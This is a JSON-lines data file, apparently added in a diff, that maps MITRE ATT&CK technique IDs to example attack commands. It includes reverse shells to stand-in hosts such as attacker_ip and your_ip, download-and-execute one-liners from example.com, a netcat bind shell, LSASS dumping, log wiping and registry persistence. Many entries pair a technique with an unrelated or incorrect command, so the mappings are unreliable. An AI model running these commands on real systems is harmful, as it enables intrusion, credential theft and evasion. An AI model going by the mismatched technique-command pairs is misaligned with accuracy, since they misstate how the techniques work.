+{"ID": "T1574.014", "Name": "AppDomainManager", "Platform": "Windows", "Command": "powershell -c \"Add-Type -TypeDefinition '[System.Reflection.Assembly]::LoadFrom(''C:\\path\\to\\malicious_assembly.dll'')'\""}
+{"ID": "T1074.002", "Name": "Remote Data Staging", "Platform": "Windows", "Command": "copy C:\\path\\to\\staged_data.txt C:\\path\\to\\staging\\location\\staged_data.txt"}
+{"ID": "T1098.006", "Name": "Additional Container Cluster Roles", "Platform": "Containers", "Command": "kubectl create clusterrolebinding additional-role-binding --clusterrole=additional-role --user=adversary-account"}
+{"ID": "T1053", "Name": "Scheduled Task/Job", "Platform": "Windows", "Command": "schtasks /create /tn \"TaskName\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 08:00:00"}
+{"ID": "T1218.007", "Name": "Msiexec", "Platform": "Windows", "Command": "msiexec.exe /a \"C:\\path\\to\\malicious.msi\" /qn /lv \"C:\\path\\to\\log.log\""}
+{"ID": "T1162", "Name": "Login Item", "Platform": "macOS", "Command": "osascript -e 'tell application \"System Events\" to set login items of login items of 1 to {\"/path/to/your/script/or/application\"}'"}
+{"ID": "T1590.003", "Name": "Network Trust Dependencies", "Platform": "PRE", "Command": "net trust show all"}
+{"ID": "T1498.002", "Name": "Reflection Amplification", "Platform": "Windows", "Command": "netsh advfirewall set allprofiles state enabled"}
+{"ID": "T1556.002", "Name": "Password Filter DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LoginProviders\" /v \"FilterDll\" /t REG_SZ /d \"C:\\path\\to\\malicious_filter.dll\" /f"}
+{"ID": "T1505.005", "Name": "Terminal Services DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\image file execution options\" /v \"RequireSignedDrivers\" /t REG_DWORD /d 0"}
+{"ID": "T1059.002", "Name": "AppleScript", "Platform": "macOS", "Command": "osascript -e 'do shell script \"ls\" with administrator privileges'"}
+{"ID": "T1176", "Name": "Software Extensions", "Platform": "Linux", "Command": "sudo apt install chromium-browser --install-recommends"}
+{"ID": "T1499.002", "Name": "Service Exhaustion Flood", "Platform": "Windows", "Command": "hping3 -S -c 10000 -a 192.168.1.100 -p 80 -f"}
+{"ID": "T1195.003", "Name": "Compromise Hardware Supply Chain", "Platform": "Linux", "Command": "sudo apt install libgcrypt20-dev"}
+{"ID": "T1106", "Name": "Native API", "Platform": "Linux", "Command": "syscall"}
+{"ID": "T1558.005", "Name": "Ccache Files", "Platform": "Linux", "Command": "klist"}
+{"ID": "T1070.007", "Name": "Clear Network Connection History and Configurations", "Platform": "Linux", "Command": "rm -rf /var/log/*"}
+{"ID": "T1558.004", "Name": "AS-REP Roasting", "Platform": "Windows", "Command": "klist /li | findstr \"preauth=no\""}
+{"ID": "T1058", "Name": "Service Registry Permissions Weakness", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\CurrentControlSet\\Services\\service_name\" /v ImagePath /t REG_SZ /d \"C:\\path\\to\\adversary-controlled\\executable.exe\""}
+{"ID": "T1584.003", "Name": "Virtual Private Server", "Platform": "PRE", "Command": "aws ec2 run-instances --image-id ami-0c55b159cbff555b5 --count 1 --instance-type t2.micro"}
+{"ID": "T1059.010", "Name": "AutoHotKey & AutoIT", "Platform": "Windows", "Command": "RunDll32.exe \"C:\\Path\\To\\Script.ahk\", Main"}
+{"ID": "T1600.001", "Name": "Reduce Key Space", "Platform": "Network Devices", "Command": "crypto key generate rsa general-keys bits 2048 modulus 512"}
+{"ID": "T1070.003", "Name": "Clear Command History", "Platform": "ESXi", "Command": "rm /var/log/shell.log"}
+{"ID": "T1202", "Name": "Indirect Command Execution", "Platform": "Windows", "Command": "forfiles /p \"C:\\path\\to\\directory\" /s /m *.exe /c \"cmd /c echo %~nf% >> C:\\output.txt\""}
+{"ID": "T1024", "Name": "Custom Cryptographic Protocol", "Platform": "Linux", "Command": "python3 -c 'import hashlib; import os; key = hashlib.sha256(b\"secret_key\").digest(); print(bytes([x ^ y for x, y in zip(os.urandom(16), key)]) + b\"secret_message\")'"}
+{"ID": "T1536", "Name": "Revert Cloud Instance", "Platform": "IaaS", "Command": "aws ec2 restore-image-from-recovery-point --recovery-point-arn arn:aws:ec2:region:account-id:recovery-point/recovery-point-id"}
+{"ID": "T1091", "Name": "Replication Through Removable Media", "Platform": "Windows", "Command": "wmic.exe process where \"imagepath\"=\"C:\\\\\\\\*autorun.inf\""}
+{"ID": "T1005", "Name": "Data from Local System", "Platform": "ESXi", "Command": "esxcli system settings get"}
+{"ID": "T1140", "Name": "Deobfuscate/Decode Files or Information", "Platform": "ESXi", "Command": "esxcli vm process kill --type=soft --vm=<vm-name>"}
+{"ID": "T1137.005", "Name": "Outlook Rules", "Platform": "Windows", "Command": "cscript \"C:\\Path\\To\\Rule.vbs\""}
+{"ID": "T1562", "Name": "Impair Defenses", "Platform": "Windows", "Command": "net stop \"Windows Firewall\""}
+{"ID": "T1586.003", "Name": "Cloud Accounts", "Platform": "PRE", "Command": "aws iam get-user --user-name \"example_user\""}
+{"ID": "T1586.002", "Name": "Email Accounts", "Platform": "PRE", "Command": "python email_account_compromise.py"}
+{"ID": "T1098.007", "Name": "Additional Local or Domain Groups", "Platform": "Windows", "Command": "net localgroup \"Administrators\" /add \"adversary_account\""}
+{"ID": "T1608.001", "Name": "Upload Malware", "Platform": "PRE", "Command": "python -c 'import requests; r = requests.get(\"http://example.com/malware.exe\"); open(\"malware.exe\", \"wb\").write(r.content)'"}
+{"ID": "T1195", "Name": "Supply Chain Compromise", "Platform": "Linux", "Command": "sudo apt update && sudo apt full-upgrade"}
+{"ID": "T1190", "Name": "Exploit Public-Facing Application", "Platform": "Containers", "Command": "docker run -it --rm -p 80:80 vulnerable-webapp"}
+{"ID": "T1558", "Name": "Steal or Forge Kerberos Tickets", "Platform": "Windows", "Command": "klist targets"}
+{"ID": "T1555", "Name": "Credentials from Password Stores", "Platform": "IaaS", "Command": "aws iam get-login-profiles"}
+{"ID": "T1567", "Name": "Exfiltration Over Web Service", "Platform": "ESXi", "Command": "curl -s https://example.com/exfiltrated_data"}
+{"ID": "T1219", "Name": "Remote Access Tools", "Platform": "Linux", "Command": "ssh user@target_system"}
+{"ID": "T1583.001", "Name": "Domains", "Platform": "PRE", "Command": "dig +short mydomain.com"}
+{"ID": "T1560.002", "Name": "Archive via Library", "Platform": "Linux", "Command": "rarfile.ArchiveFile('archive.rar').extract('path/to/data.txt')"}
+{"ID": "T1055.003", "Name": "Thread Execution Hijacking", "Platform": "Windows", "Command": "OpenThread(NULL, 0, hProcess, NULL, &hThread, NULL, 0x10000);"}
+{"ID": "T1079", "Name": "Multilayer Encryption", "Platform": "Linux", "Command": "gpg --encrypt --recipient <recipient_email> | openssl enc -aes-256-cbc -base64 | ssh <target_server>"}
+{"ID": "T1036", "Name": "Masquerading", "Platform": "Containers", "Command": "docker run -it --rm -v /:/host --name=ls /bin/bash -c \"mv /bin/ls /bin/ls.real && ln -s /bin/ls.real /bin/ls\""}
+{"ID": "T1546.011", "Name": "Application Shimming", "Platform": "Windows", "Command": "wmic datafile where \"path='C:\\\\Windows\\\\AppPatch\\\\sysmain.sdb'\" get name"}
+{"ID": "T1552", "Name": "Unsecured Credentials", "Platform": "Windows", "Command": "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable"}
+{"ID": "T1547.010", "Name": "Port Monitors", "Platform": "Windows", "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\{MONITOR_NAME}\\Driver\" /v Driver /t REG_SZ /d \"C:\\Windows\\System32\\{DLL_NAME}.dll\""}
+{"ID": "T1070.008", "Name": "Clear Mailbox Data", "Platform": "Linux", "Command": "mail -r"}
+{"ID": "T1037.002", "Name": "Login Hook", "Platform": "macOS", "Command": "defaults write /Library/Preferences/com.apple.loginwindow LoginHook '/path/to/malicious/script.sh'"}
+{"ID": "T1659", "Name": "Content Injection", "Platform": "Linux", "Command": "tcpdump -i any -s 0 -w captured_traffic.pcap -vv -n -c 1000 'tcp port 80 and not (src host 192.168.1.1 and dst host 192.168.1.1)'"}
+{"ID": "T1055", "Name": "Process Injection", "Platform": "Linux", "Command": "python -c 'import os; os.system(\"bash -c \\\"bash -i >& /dev/tcp/your_ip/your_port 0>&1\\\"\"')"}
+{"ID": "T1567.004", "Name": "Exfiltration Over Webhook", "Platform": "Windows", "Command": "powershell -Command \"Invoke-WebRequest -Uri 'https://webhook.site/your-webhook-url' -Method Post -Body @{key='value'}\""}
+{"ID": "T1139", "Name": "Bash History", "Platform": "Linux", "Command": "history -c"}
+{"ID": "T1205", "Name": "Traffic Signaling", "Platform": "Linux", "Command": "tcpdump -i eth0 -n -vvv -s 0 -c 100 -W 100 -q 'tcp port 80 and (tcp[tcpflags] & (syn|ack) == syn)'"}
+{"ID": "T1021.008", "Name": "Direct Cloud VM Connections", "Platform": "IaaS", "Command": "aws ec2 get-console-output --instance-id i-0123456789abcdef0"}
+{"ID": "T1503", "Name": "Credentials from Web Browsers", "Platform": "Linux", "Command": "sqlite3 /home/user/.mozilla/firefox/*.default/places.sqlite \"SELECT moz_name, moz_password FROM moz_logins\""}
+{"ID": "T1218", "Name": "System Binary Proxy Execution", "Platform": "Windows", "Command": "cmd /c \"powershell.exe -c \\\"powershell.exe -c 'Invoke-Expression -Command (Get-Content -Path 'C:\\path\\to\\malicious\\script.ps1')\\\"\""}
+{"ID": "T1153", "Name": "Source", "Platform": "Linux", "Command": "source /path/to/filename"}
+{"ID": "T1038", "Name": "DLL Search Order Hijacking", "Platform": "Windows", "Command": "dir /s /b *.dll"}
+{"ID": "T1050", "Name": "New Service", "Platform": "Windows", "Command": "sc create \"ServiceName\" binPath= \"C:\\Path\\To\\Executable.exe\""}
+{"ID": "T1070.006", "Name": "Timestomp", "Platform": "ESXi", "Command": "touch -a -m -t 2024/07/26.14:30:00 <filename>"}
+{"ID": "T1557.004", "Name": "Evil Twin", "Platform": "Network Devices", "Command": "airmon-ng start wlan0"}
+{"ID": "T1620", "Name": "Reflective Code Loading", "Platform": "Linux", "Command": "python -c 'import os; exec(os.popen(\"curl https://example.com/malicious_payload\").read())'"}
+{"ID": "T1016.002", "Name": "Wi-Fi Discovery", "Platform": "Linux", "Command": "ls /etc/NetworkManager/system-connections/"}
+{"ID": "T1480.002", "Name": "Mutual Exclusion", "Platform": "Linux", "Command": "ls /proc/acpi/lock"}
+{"ID": "T1564.011", "Name": "Ignore Process Interrupts", "Platform": "Linux", "Command": "nohup command > /dev/null &"}
+{"ID": "T1611", "Name": "Escape to Host", "Platform": "Windows", "Command": "docker run -it --rm -v //c:/c/ --privileged msysgit/bash -c \"powershell -c 'Get-WmiObject -Class Win32_Process | ForEach-Object { $_.Terminate()}'\""}
+{"ID": "T1518.002", "Name": "Backup Software Discovery", "Platform": "Windows", "Command": "netsh advfirewall show all"}
+{"ID": "T1547.009", "Name": "Shortcut Modification", "Platform": "Windows", "Command": "mklink \"%USERPROFILE%\\Desktop\\Shortcut.lnk\" \"C:\\path\\to\\malware.exe\""}
+{"ID": "T1010", "Name": "Application Window Discovery", "Platform": "Linux", "Command": "wmctrl -m"}
+{"ID": "T1569.003", "Name": "Systemctl", "Platform": "Linux", "Command": "systemctl start malicious_service"}
+{"ID": "T1032", "Name": "Standard Cryptographic Protocol", "Platform": "Linux", "Command": "openssl enc -aes-256-cbc -in input.txt -out output.txt -k 12345678 -md sha256"}
+{"ID": "T1087.003", "Name": "Email Account", "Platform": "Windows", "Command": "Get-GlobalAddressList"}
+{"ID": "T1062", "Name": "Hypervisor", "Platform": "Windows", "Command": "bcdedit /set hypervisorlaunchtype auto"}
+{"ID": "T1497.003", "Name": "Time Based Checks", "Platform": "Linux", "Command": "gettimeofday()"}
+{"ID": "T1182", "Name": "AppCert DLLs", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\\\" \"path\\to\\malicious_dll.dll\""}
+{"ID": "T1218.003", "Name": "CMSTP", "Platform": "Windows", "Command": "cmstp.exe /install \"<path_to_inf_file>\""}
+{"ID": "T1563.001", "Name": "SSH Hijacking", "Platform": "Linux", "Command": "ssh -L 8080:localhost:8080 user@target_host"}
+{"ID": "T1562.002", "Name": "Disable Windows Event Logging", "Platform": "Windows", "Command": "sc config eventlog start=auto"}
+{"ID": "T1029", "Name": "Scheduled Transfer", "Platform": "Linux", "Command": "crontab -e"}
+{"ID": "T1021.002", "Name": "SMB/Windows Admin Shares", "Platform": "Windows", "Command": "net use \\\\localhost\\C$ /user:administrator"}
+{"ID": "T1525", "Name": "Implant Internal Image", "Platform": "IaaS", "Command": "aws ec2 create-image --name \"backdoored-image\" --description \"backdoored-image\" --no-reboot --instance-id i-1234567890abcdef0"}
+{"ID": "T1572", "Name": "Protocol Tunneling", "Platform": "ESXi", "Command": "esxcli network ip tunnel add --ip-tunnel-name=ssh-tunnel --ip-tunnel-protocol=gre --ip-tunnel-src-ip=192.168.1.100 --ip-tunnel-dst-ip=192.168.1.200 --ip-tunnel-dst-port=22"}
+{"ID": "T1218.002", "Name": "Control Panel", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Desktop\" /v \"MaliciousApplet\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1599.001", "Name": "Network Address Translation Traversal", "Platform": "Network Devices", "Command": "show run | include nat"}
+{"ID": "T1608.002", "Name": "Upload Tool", "Platform": "PRE", "Command": "curl -o /tmp/tool.zip https://example.com/tool.zip && unzip /tmp/tool.zip -d /tmp && chmod +x /tmp/tool && /tmp/tool"}
+{"ID": "T1547.005", "Name": "Security Support Provider", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\CurrentControlSet\\Control\\Lsa\\Security Packages\" /v \"MySSP\" /t REG_SZ /d \"C:\\path\\to\\myssp.dll\" /f"}
+{"ID": "T1036.011", "Name": "Overwrite Process Arguments", "Platform": "Linux", "Command": "echo -n \"spoofed_command\" > /proc/$$/cmdline"}
+{"ID": "T1004", "Name": "Winlogon Helper DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Notify /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1009", "Name": "Binary Padding", "Platform": "Linux", "Command": "dd if=/dev/zero bs=1024 count=1 of=malware_binary.bin"}
+{"ID": "T1550", "Name": "Use Alternate Authentication Material", "Platform": "Windows", "Command": "wmic.exe process where \"imagepath = \\\"C:\\\\Windows\\\\System32\\\\lsass.exe\\\"\""}
+{"ID": "T1076", "Name": "Remote Desktop Protocol", "Platform": "Windows", "Command": "tscon.exe :1"}
+{"ID": "T1597.001", "Name": "Threat Intel Vendors", "Platform": "PRE", "Command": "python threatintel.py --search \"targeting information\" --vendor \"Threat Intelligence Vendor\""}
+{"ID": "T1011", "Name": "Exfiltration Over Other Network Medium", "Platform": "Linux", "Command": "nc -lvp 8080 -e /bin/bash"}
+{"ID": "T1602.002", "Name": "Network Device Configuration Dump", "Platform": "Network Devices", "Command": "show running"}
+{"ID": "T1589", "Name": "Gather Victim Identity Information", "Platform": "PRE", "Command": "python social_engineering/social_media/social_media_gathering.py"}
+{"ID": "T1131", "Name": "Authentication Package", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Software Protection\\PS\\1\" /v \"Authentication Packages\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1181", "Name": "Extra Window Memory Injection", "Platform": "Windows", "Command": "SetWindowLong(hwnd, GWL_USERDATA, (LPARAM) 0x12345678);"}
+{"ID": "T1562.004", "Name": "Disable or Modify System Firewall", "Platform": "ESXi", "Command": "esxcli network firewall set --enabled=false"}
+{"ID": "T1560", "Name": "Archive Collected Data", "Platform": "Linux", "Command": "tar -czf archive.tar.gz /path/to/data"}
+{"ID": "T1152", "Name": "Launchctl", "Platform": "macOS", "Command": "launchctl submit -l my_agent - /bin/bash -c \"echo 'Hello, World!'\""}
+{"ID": "T1553.003", "Name": "SIP and Trust Provider Hijacking", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}\" /v Dll /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1483", "Name": "Domain Generation Algorithms", "Platform": "Linux", "Command": "dig istgmxdejdnxyla.ru"}
+{"ID": "T1185", "Name": "Browser Session Hijacking", "Platform": "Windows", "Command": "powershell.exe -ExecutionPolicy Bypass -Command \"Add-Type -AssemblyName PresentationCore; $ie = New-Object -ComObject Shell.Application; $ie.Navigate('https://example.com'); $ie.DocumentCompleted += {$ie.Document.GetElementById('username').value = 'username'; $ie.Document.GetElementById('password').value = 'password'; $ie.Document.GetElementById('login').InvokeMember('click')}\""}
+{"ID": "T1021", "Name": "Remote Services", "Platform": "Linux", "Command": "ssh user@target_host"}
+{"ID": "T1071.003", "Name": "Mail Protocols", "Platform": "Linux", "Command": "echo \"Subject: Test\" | openssl s_client -connect mail.example.com:25 -crlf -quiet -no_tls -ign_eof"}
+{"ID": "T1556.007", "Name": "Hybrid Identity", "Platform": "Windows", "Command": "net stop AzureADConnectAuthenticationAgentService"}
+{"ID": "T1595.002", "Name": "Vulnerability Scanning", "Platform": "PRE", "Command": "nmap -sV -A 192.168.1.1"}
+{"ID": "T1059.009", "Name": "Cloud API", "Platform": "IaaS", "Command": "az vm create --resource-group MyResourceGroup --name MyVm --image UbuntuServer --admin-username azureuser --admin-password \"P@ssw0rd123\" --size Standard_DS2_v2"}
+{"ID": "T1596", "Name": "Search Open Technical Databases", "Platform": "PRE", "Command": "whois example.com"}
+{"ID": "T1218.015", "Name": "Electron Applications", "Platform": "Linux", "Command": "electron --enable-features=CrashReporter,ignore-gpu-block-on-crash --disable-gpu-sandbox --gpu-launcher=\"bash -c 'bash -i >& /dev/tcp/10.0.1.1/4242 0>&1'\""}
+{"ID": "T1562.012", "Name": "Disable or Modify Linux Audit System", "Platform": "Linux", "Command": "systemctl stop auditd"}
+{"ID": "T1207", "Name": "Rogue Domain Controller", "Platform": "Windows", "Command": "netdom add dc <DC_name> /realm <domain_name> /syskey:<syskey>"}
+{"ID": "T1553.006", "Name": "Code Signing Policy Modification", "Platform": "Windows", "Command": "bcdedit.exe /set TESTSIGNING ON"}
+{"ID": "T1610", "Name": "Deploy Container", "Platform": "Containers", "Command": "docker run -it --rm -v /host:/mnt --privileged my_malicious_image"}
+{"ID": "T1107", "Name": "File Deletion", "Platform": "Linux", "Command": "rm -rf /path/to/file"}
+{"ID": "T1145", "Name": "Private Keys", "Platform": "Linux", "Command": "find / -name \"*.key\" -o -name \"*.pgp\" -o -name \"*.gpg\" -o -name \"*.ppk\" -o -name \"*.p12\" -o -name \"*.pem\" -o -name \"*.pfx\" -o -name \"*.cer\" -o -name \"*.p7b\" -o -name \"*.asc\""}
+{"ID": "T1112", "Name": "Modify Registry", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousApp\" /t REG_SZ /d \"C:\\path\\to\\malicious\\app.exe\""}
+{"ID": "T1543.004", "Name": "Launch Daemon", "Platform": "macOS", "Command": "launchctl load -w /Library/LaunchDaemons/malicious.plist"}
+{"ID": "T1580", "Name": "Cloud Infrastructure Discovery", "Platform": "IaaS", "Command": "aws ec2 describe-instances"}
+{"ID": "T1555.003", "Name": "Credentials from Web Browsers", "Platform": "Linux", "Command": "sqlite3 /home/user/.mozilla/firefox/*.default/places.sqlite \"SELECT moz_name, moz_password FROM moz_places\""}
+{"ID": "T1574.008", "Name": "Path Interception by Search Order Hijacking", "Platform": "Windows", "Command": "cmd.exe /c net user"}
+{"ID": "T1491", "Name": "Defacement", "Platform": "Windows", "Command": "net stop w3svc"}
+{"ID": "T1535", "Name": "Unused/Unsupported Cloud Regions", "Platform": "IaaS", "Command": "aws ec2 describe-regions"}
+{"ID": "T1557.003", "Name": "DHCP Spoofing", "Platform": "Linux", "Command": "dhcpcd -n -s 192.168.1.100 -p 67 -i eth0"}
+{"ID": "T1155", "Name": "AppleScript", "Platform": "macOS", "Command": "osascript -e 'tell application \"Finder\" to make Finder window'"}
+{"ID": "T1563", "Name": "Remote Service Session Hijacking", "Platform": "Linux", "Command": "ssh -L 8080:localhost:3389 user@target_linux_system"}
+{"ID": "T1564.013", "Name": "Bind Mounts", "Platform": "Linux", "Command": "mount -o bind /proc/benign-process /proc/malicious-process"}
+{"ID": "T1027.001", "Name": "Binary Padding", "Platform": "Linux", "Command": "dd if=/dev/zero bs=1024 count=1 of=malware_binary.bin"}
+{"ID": "T1505.003", "Name": "Web Shell", "Platform": "Linux", "Command": "python -c 'import os; os.system(\"bash -i >& /dev/tcp/attacker_ip/8080 0>&1\")'"}
+{"ID": "T1484.001", "Name": "Group Policy Modification", "Platform": "Windows", "Command": "secpol.msc"}
+{"ID": "T1217", "Name": "Browser Information Discovery", "Platform": "Linux", "Command": "find /home/* -type f -o \\( -name \"*.ini\" -o -name \"*.dat\" -o -name \"*.db\" -o -name \"*.sqlite\" \\)"}
+{"ID": "T1552.004", "Name": "Private Keys", "Platform": "Linux", "Command": "find / -name \"*.key\" -o -name \"*.pgp\" -o -name \"*.gpg\" -o -name \"*.ppk\" -o -name \"*.p12\" -o -name \"*.pem\" -o -name \"*.pfx\" -o -name \"*.cer\" -o -name \"*.p7b\" -o -name \"*.asc\""}
+{"ID": "T1583.004", "Name": "Server", "Platform": "PRE", "Command": "python setup_server.py"}
+{"ID": "T1021.006", "Name": "Windows Remote Management", "Platform": "Windows", "Command": "winrm -r https://example.com -u username -p password -auth authenticode -i https://example.com/winrm.svc/config -skipcertvalidation -enablesignedremotemanager"}
+{"ID": "T1011.001", "Name": "Exfiltration Over Bluetooth", "Platform": "Linux", "Command": "bluetoothctl info"}
+{"ID": "T1078.001", "Name": "Default Accounts", "Platform": "Windows", "Command": "net user administrator /active:no"}
+{"ID": "T1547.003", "Name": "Time Providers", "Platform": "Windows", "Command": "sc config w32time start= auto"}
+{"ID": "T1183", "Name": "Image File Execution Options Injection", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /t REG_SZ /d \"C:\\dbg\\ntsd.exe -g notepad.exe\""}
+{"ID": "T1085", "Name": "Rundll32", "Platform": "Windows", "Command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://example.com/malicious.sct\")"}
+{"ID": "T1031", "Name": "Modify Existing Service", "Platform": "Windows", "Command": "sc config ServiceName binPath= \"C:\\path\\to\\malicious\\executable.exe\""}
+{"ID": "T1546.005", "Name": "Trap", "Platform": "macOS", "Command": "trap 'echo \"Interrupt received\"; exit' INT"}
+{"ID": "T1574.006", "Name": "Dynamic Linker Hijacking", "Platform": "Linux", "Command": "export LD_PRELOAD=/path/to/malicious_library.so"}
+{"ID": "T1136.001", "Name": "Local Account", "Platform": "Linux", "Command": "useradd -m newaccount"}
+{"ID": "T1681", "Name": "Search Threat Vendor Data", "Platform": "PRE", "Command": "shodan search \"example threat actor domain\""}
+{"ID": "T1674", "Name": "Input Injection", "Platform": "Windows", "Command": "powershell -ExecutionPolicy Bypass -Command \"Invoke-Expression -Command (Get-Content -Path 'C:\\path\\to\\malicious\\script.ps1')\""}
+{"ID": "T1092", "Name": "Communication Through Removable Media", "Platform": "Linux", "Command": "cp /path/to/source /path/to/destination"}
+{"ID": "T1070.001", "Name": "Clear Windows Event Logs", "Platform": "Windows", "Command": "wevtutil cl system"}
+{"ID": "T1585.002", "Name": "Email Accounts", "Platform": "PRE", "Command": "netsh advfirewall set allprofiles state enabled"}
+{"ID": "T1557.001", "Name": "LLMNR/NBT-NS Poisoning and SMB Relay", "Platform": "Windows", "Command": "nbtstat -a <target_IP>"}
+{"ID": "T1222", "Name": "File and Directory Permissions Modification", "Platform": "ESXi", "Command": "esxcli storage filesystem permission set -a 755 -d /vmfs/volumes/..."}
+{"ID": "T1003.001", "Name": "LSASS Memory", "Platform": "Windows", "Command": "procdump -ma lsass.exe -ma lsass_dump"}
+{"ID": "T1053.001", "Name": "At (Linux)", "Platform": "Linux", "Command": "at -f /path/to/malicious/script.sh"}
+{"ID": "T1176.002", "Name": "IDE Extensions", "Platform": "Linux", "Command": "code --install-extension vscode-remote-ssh"}
+{"ID": "T1179", "Name": "Hooking", "Platform": "Windows", "Command": "CreateRemoteThread(NULL, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"), NULL, NULL);"}
+{"ID": "T1595", "Name": "Active Scanning", "Platform": "PRE", "Command": "nmap -sS 192.168.1.0/24"}
+{"ID": "T1027.016", "Name": "Junk Code Insertion", "Platform": "Linux", "Command": "echo -n \"\" > /dev/null"}
+{"ID": "T1547.011", "Name": "Plist Modification", "Platform": "macOS", "Command": "defaults write /Library/Preferences/com.apple.loginitems.plist DYLD_INSERT_LIBRARIES /path/to/malicious.dylib"}
+{"ID": "T1548", "Name": "Abuse Elevation Control Mechanism", "Platform": "Linux", "Command": "sudo -s"}
+{"ID": "T1134.002", "Name": "Create Process with Token", "Platform": "Windows", "Command": "psexec -s -i -h cmd.exe"}
+{"ID": "T1548.001", "Name": "Setuid and Setgid", "Platform": "Linux", "Command": "chmod +s /path/to/file"}
+{"ID": "T1547.004", "Name": "Winlogon Helper DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Notify /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1019", "Name": "System Firmware", "Platform": "Windows", "Command": "bcdedit /set {bootmgr} timeout 3"}
+{"ID": "T1021.003", "Name": "Distributed Component Object Model", "Platform": "Windows", "Command": "reg add \"HKLM\\Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\" /ve /t REG_SZ /d \"DCOM\" /f"}
+{"ID": "T1042", "Name": "Change Default File Association", "Platform": "Windows", "Command": "assoc.txt=.txtfile"}
+{"ID": "T1117", "Name": "Regsvr32", "Platform": "Windows", "Command": "regsvr32 /s /u \"%~dp0malicious.dll\""}
+{"ID": "T1110.003", "Name": "Password Spraying", "Platform": "Containers", "Command": "nmap -p 22,21,139,445,88,3389,80,443,1433,1521,3306,5900 -script http-password-spray.nse -script-args password=\"Password01\""}
+{"ID": "T1090.002", "Name": "External Proxy", "Platform": "ESXi", "Command": "esxcli network ip route add -p 0.0.0.0/0 -g 192.168.1.100"}
+{"ID": "T1056.003", "Name": "Web Portal Capture", "Platform": "Linux", "Command": "tcpdump -i any -A -s 0 -w capture.pcap -v host <target_ip> and port 443"}
+{"ID": "T1589.002", "Name": "Email Addresses", "Platform": "PRE", "Command": "python -c 'import requests; r = requests.get(\"https://autodiscover.office.com/autodiscover/autodiscover.xml\"); print(r.json())'"}
+{"ID": "T1164", "Name": "Re-opened Applications", "Platform": "macOS", "Command": "defaults write com.apple.loginwindow LoginWindowReopenApplications -array-add \"/path/to/malicious/executable\""}
+{"ID": "T1054", "Name": "Indicator Blocking", "Platform": "Windows", "Command": "Get-WinEvent -FilterHashtable @{LogName=\"Security\"} | Where-Object {$_.Id -ne 4624} | Stop-EventLog"}
+{"ID": "T1598.004", "Name": "Spearphishing Voice", "Platform": "PRE", "Command": "powershell -c \"Add-Type -AssemblyName PresentationCore; $w = [Windows.Forms.MessageBox]; $w.Show('This is a test message to demonstrate a vishing attack.')\""}
+{"ID": "T1108", "Name": "Redundant Access", "Platform": "Windows", "Command": "net user /add username password /expires:never"}
+{"ID": "T1193", "Name": "Spearphishing Attachment", "Platform": "Windows", "Command": "powershell -Command \"Invoke-Item (New-Object System.Net.WebClient).DownloadString('https://example.com/malware.exe')\""}
+{"ID": "T1003.005", "Name": "Cached Domain Credentials", "Platform": "Windows", "Command": "secretsdump.py -sam -h <domain> -u <username>"}
+{"ID": "T1098.004", "Name": "SSH Authorized Keys", "Platform": "Linux", "Command": "echo'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> ~/.ssh/authorized_keys"}
+{"ID": "T1673", "Name": "Virtual Machine Discovery", "Platform": "ESXi", "Command": "esxcli vm process list"}
+{"ID": "T1215", "Name": "Kernel Modules and Extensions", "Platform": "Linux", "Command": "modprobe module_name"}
+{"ID": "T1101", "Name": "Security Support Provider", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Software Protection\\ServiceProvider\" /v \"MySSP\" /t REG_SZ /d \"C:\\Path\\To\\MySSP.dll\" /f"}
+{"ID": "T1590.006", "Name": "Network Security Appliances", "Platform": "PRE", "Command": "nmap -sV -A <target_IP>"}
+{"ID": "T1546.012", "Name": "Image File Execution Options Injection", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe\" /v Debugger /t REG_SZ /d \"C:\\path\\to\\malicious_debugger.exe\" /f"}
